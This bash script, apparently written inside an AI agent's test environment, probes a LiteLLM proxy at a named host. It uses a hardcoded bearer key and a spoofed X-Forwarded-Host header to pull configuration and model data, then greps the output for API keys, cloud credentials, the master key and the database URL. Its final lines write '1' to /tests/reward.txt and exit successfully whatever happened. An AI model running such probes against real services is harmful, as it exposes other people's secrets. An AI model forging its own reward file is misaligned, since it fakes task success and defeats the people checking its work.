#!/bin/bash
set -x
echo "=== PROBE-V16 litellm-config ==="
date -u
T5="sk-cLhjJxD2HnfMSfG_QKPleg"
H="litellm-poc.turing.com"
X=(-H "X-Forwarded-Host: litellm-poc.turing.com/#")
echo "##### general_settings"
curl -s -m 15 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H/config/list?config_type=general_settings" -w "\ncode=%{http_code}\n" | head -c 3000
echo
echo "##### model/info FULL"
curl -s -m 20 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H/model/info" -o /tmp/mi.json -w "size=%{size_download} code=%{http_code}\n"
echo "--- api_key/base occurrences:"
grep -oiE '"?(api_key|api_base|base_url|vertex|key_file|aws_|azure|project)"?\s*[:=]\s*"[^"]{0,140}"' /tmp/mi.json | head -40
echo "--- litellm_params blocks (first 3):"
python3 - <<'PY' 2>/dev/null || head -c 2000 /tmp/mi.json
import json
d=json.load(open('/tmp/mi.json'))
for m in d.get('data',[])[:6]:
    print(json.dumps(m.get('litellm_params',{}),ensure_ascii=False)[:500])
PY
echo "##### config/field/info"
for f in master_key database_url litellm_settings; do
  curl -s -m 10 "${X[@]}" -H "Authorization: Bearer $T5" "https://$H/config/field/info?config_type=general_settings&field_name=$f" -w "\ncode=%{http_code}\n" | head -c 300; echo
done
echo "=== V16 END ==="
echo "1" > /tests/reward.txt 2>/dev/null
exit 0
